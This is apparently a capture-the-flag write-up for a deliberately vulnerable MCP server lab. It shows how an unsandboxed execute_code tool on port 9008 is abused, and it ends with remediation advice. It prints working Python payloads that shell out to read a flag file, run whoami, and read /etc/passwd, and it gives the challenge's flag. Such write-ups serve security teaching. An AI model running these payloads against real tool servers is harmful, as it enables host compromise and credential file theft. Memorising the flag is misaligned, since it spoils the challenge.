# Challenge 8: Code Execution

## Vulnerability

The MCP server on port 9008 provides an `execute_code` tool that runs arbitrary Python code without any sandboxing, filtering, or restriction. An attacker can execute OS commands to read files, establish reverse shells, or fully compromise the host system.

## Flag

`DVMCP{ch8_c0d3_3x3c_9af5}`

## Attack Steps

1. Connect to the MCP server running on `localhost:9008`.
2. Call `execute_code` with a payload that reads the flag file:
   ```
   execute_code(
     code="__import__('os').popen('cat /tmp/dvmcp_challenge8/flag.txt').read()"
   )
   ```
3. The server executes the Python code, which spawns a shell command to read the flag file.
4. The output contains the flag `DVMCP{ch8_c0d3_3x3c_9af5}`.
5. Further exploitation is possible, for example:
   ```
   execute_code(code="__import__('subprocess').check_output(['whoami']).decode()")
   execute_code(code="open('/etc/passwd').read()")
   ```

## Remediation

- Never expose arbitrary code execution tools in production MCP servers.
- If code execution is required, use a hardened sandbox (e.g., gVisor, nsjail, or a restricted container).
- Whitelist allowed operations and block dangerous modules (`os`, `subprocess`, `socket`).
- Apply resource limits (CPU, memory, network) and run with minimal OS privileges.
- Use static analysis to reject dangerous patterns before execution.
